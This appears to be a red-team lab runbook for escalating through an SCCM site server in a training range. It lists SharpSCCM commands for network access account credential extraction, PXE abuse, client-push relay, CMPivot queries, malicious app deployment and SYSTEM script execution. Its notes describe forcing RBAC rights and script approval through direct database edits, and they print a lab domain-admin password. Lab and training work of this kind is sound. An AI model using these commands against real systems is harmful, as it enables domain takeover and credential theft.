# CAMPAIGNS v3 — Branch C — SCCM Escalation (range.local)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch C: SCCM Escalation (range.local)


**Diverges from:** Phase 8 (cross-forest access gives `svc_sccm`).
**Converges to:** Phase 8 (NAA extraction gives range.local DA).
**SCCM Site Server:** mbr02 (192.168.77.23) — site code `CAD`.

`svc_sccm` is SCCM Full Administrator on the `CAD` site. From this position:

> **Verification note (2026-08-01 — deep):** WT034 NAA verified (vault bait → `RANGE\svc_naa` = DA) + confirmed in provider. Deep surface validated as `range\svc_sccm` via SMS Provider WMI (explicit creds, ws01): local `SMS Admins` membership (incl. cross-forest `CADRE\chief_command`/`analyst_purple`), PXE approved cert + 2 boot images, NAA-in-policy, client-push component enabled, `SMS_Scripts.CreateScripts` + `SMS_Package`/`SMS_Program` (SYSTEM) creation work. **CORRECTED — AdminService IS deployed** (self-hosted `SMS_REST_PROVIDER` in `SMS_EXECUTIVE`, no IIS; `/AdminService/v1.0/` → 401 = up). CD chain verified to the ST (S4U2Proxy fixed: UAC `TrustedToAuthForDelegation`). **SPN owner FIXED + VERIFIED (2026-08-01):** the self-hosted AdminService always runs as LocalSystem and can only decrypt machine-account tickets → `HTTP/mbr02.range.local` MOVED to `mbr02$` (svc_sccm keeps decoy `HTTP/sccm.range.local` for WT033 Kerberoast; CD unchanged). Verified live: getST → ST encrypted to `mbr02$` → `AdminService/wmi/SMS_Site` → **200** as `administrator` (anon 401). WT037/039 auth gate CLOSED. `SMS_Advertisement.Put` = Generic failure via raw WMI (console needed) → WT038/039 full exec via console. **`cifs/mbr02.range.local` SPN missing** → SMB Kerberos to mbr02 broken (verify-playbook candidate). SharpSCCM v2.0.13 uses `-mp`/`-sms` (not v1 `-s`); `get naa`/`get secrets` need a computer account (or PXE cert+media GUID), not a user logon; `get`/`exec` use current session token (no `-u/-p`) — replicate with PowerShell WMI + explicit creds (proven). Test objects cleaned up; provisioning restored.

> **Verification note (2026-08-02 — FULL EXEC):** **WT037 CMPivot ✅ and WT039 script-as-SYSTEM ✅ VERIFIED live from ws01 as `range\svc_sccm`** against the **WS01 managed client** (ResourceID 16777220). Three enablers fixed in order — (1) **BGB fast channel dead:** `C:\Program Files\SMS_CCM\SMS_BGB` vdir empty → `/bgb/handler.ashx` 500 → installed `cd.latest\SMSSETUP\BIN\X64\bgbisapi.msi` + restart SMS_EXECUTIVE → **TCP 10123 up**, client signed in; (2) **svc_sccm never an RBAC admin** (only `MBR02\vagrant`) → **Takeover-1 DB grant** (`RBAC_Admins` + `RBAC_ExtendedPermissions` mirroring admin 16777217) → Device 403→200; (3) **script approval** → `UPDATE Scripts SET ApprovalState=3` (`UpdateApprovalState` 500: author can't self-approve). WT037: `RunCMPivot` (LogicalDisk) → live data (`DeviceID:"C:", FileSystem:"NTFS", FreeSpace:153601, SystemName:"WS01"`). WT039: `SMS_Scripts.CreateScripts` via AdminService wmi passthrough → `RunScript` → `ScriptOutput: "nt authority\system"` + markers on WS01. Full recipes in `docs/sccm-integration-guide.md` **Phase 6B**. Reference flow = SCCMHunter (`sccmhunter.py admin` → `interact <id>` → `script /path.ps1`), see mayfly277 SCCM-LAB part0x2/0x3.

#### NAA Credential Extraction (WT034) — Fastest to DA

```powershell
SharpSCCM.exe get naa -s mbr02.range.local
# Returns: RANGE\svc_naa : N@A_s3rv1c3!  (svc_naa is Domain Admin)
# NOTE (v2.0.13): get naa/get secrets = same command, requires a COMPUTER ACCOUNT (or PXE cert -c + media GUID -m), not a user logon. WT034 verified via vault bait file instead.
```

#### Full SCCM Attack Chain (WT034–039 — Plan 1.1 first-class)

> **Do not stop at NAA.** Automate/verify WT035–039 as Branch C graph nodes (SharpSCCM staged via **ws01** primary path; P-FOREST VMs required).

| WT# | Attack            | Command                                                 | What it does                     | Plan 1.1 |
| --- | ----------------- | ------------------------------------------------------- | -------------------------------- | -------- |
| 034 | NAA Extraction    | `SharpSCCM.exe get naa -s mbr02.range.local`            | `RANGE\svc_naa` DA creds         | Spine P8 + Branch C |
| 035 | PXE Boot Abuse    | `SharpSCCM get pxe -s mbr02`                            | Extract boot image + creds       | Branch C |
| 036 | Client Push Relay | `SharpSCCM client-push -s mbr02 -t 192.168.77.22`       | Relay to SMB target              | Branch C |
| 037 | CMPivot Abuse     | `SharpSCCM invoke cmpivot -s mbr02 -q "..."`            | Arbitrary queries on all clients | Branch C |
| 038 | App Deployment    | `SharpSCCM exec -s mbr02 -t all -c "..."`               | Deploy malicious app to all      | Branch C |
| 039 | Site Takeover     | `SharpSCCM invoke script -s mbr02 -t mbr02 -c "whoami"` | Execute on site server           | Branch C (HITL gate) |


#### Additional Auxiliary Attacks


| WT# | Attack         | Relevant Domain                         |
| --- | -------------- | --------------------------------------- |
| 030 | WSUS Abuse     | range.local                             |
| 049 | VSC Enrollment | Certificate enrollment via VSC template |


---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-branch-b.md`](CAMPAIGNS-RUNBOOK-branch-b.md) · Next: [`CAMPAIGNS-RUNBOOK-branch-d.md`](CAMPAIGNS-RUNBOOK-branch-d.md) →
